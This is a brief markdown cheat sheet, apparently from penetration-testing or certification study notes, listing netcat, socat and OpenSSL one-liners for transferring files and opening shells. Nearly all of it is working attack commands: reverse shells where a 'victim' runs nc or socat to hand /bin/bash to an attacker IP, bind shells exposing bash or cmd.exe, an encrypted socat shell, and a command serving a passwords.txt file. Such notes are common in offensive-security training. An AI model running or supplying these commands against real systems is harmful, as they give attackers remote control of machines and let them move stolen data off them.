# Utilities 
useful CLI utilities 

## File Transfers
- netcat
	- send wget.exe to a nc listener on port 4444:
`nc -nv {ip-address} 4444 < /usr/share/windows-resources/binaries/wget.exe`
	- receive a file on port 4444 and name it wget.exe:
`nc -nlvp 4444 > wget.exe`

- socat
	- Share a file called passwords.txt on port 443:
`sudo socat TCP4-LISTEN:443,fork file:passwords.txt`
	- Receive a file being hosted on port 443 and save it to passwords.txt:
`socat TCP4:{ip-address}:443 file:passwords.txt,create`

## Reverse Shells
Victim connnects and attacker listens. Used 95% of the time.

- netcat
	- attacker runs: `nc -nlvp 4444`
	- victim runs: `nc -nv {ip-address} 4444 -e /bin/bash` 
- socat
	- attacker runs: `sudo socat -d -d  TCP4-LISTEN:4444 STDOUT`
	- victim runs: `socat TCP4:{ip-address}:4444 EXEC:/bin/bash`

## Bind Shells
Victim listens and attacker connects. Useful when bypassing firewalls or when reverse shells "just don't work".

- netcat
	- victim runs: `nc -nlvp 4444 -e cmd.exe`
	- attacker runs: `nc -nv 10.11.0.22 4444`

- socat
	- victim runs: `socat -d -d TCP4-LISTEN:4444 EXEC:/bin/bash`
	- attacker runs: `socat - TCP4:{ip-address}:4444`

## Encrypted shells with OpenSSL
Utilize SSL certificates to encrypt data sent between hosts

- create an openssl certificate
	- `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 100 -out bind_shell.crt`
- concatenate the certififcate and private key into a .pem file
	- `cat bind_shell.key bind_shell.crt > bind_shell.pem`
 - socat listener utilizing the cert
 	- `sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`
 - socat SSL connection to listener
 	- `socat - OPENSSL:{ip-address}:443,verify=0`
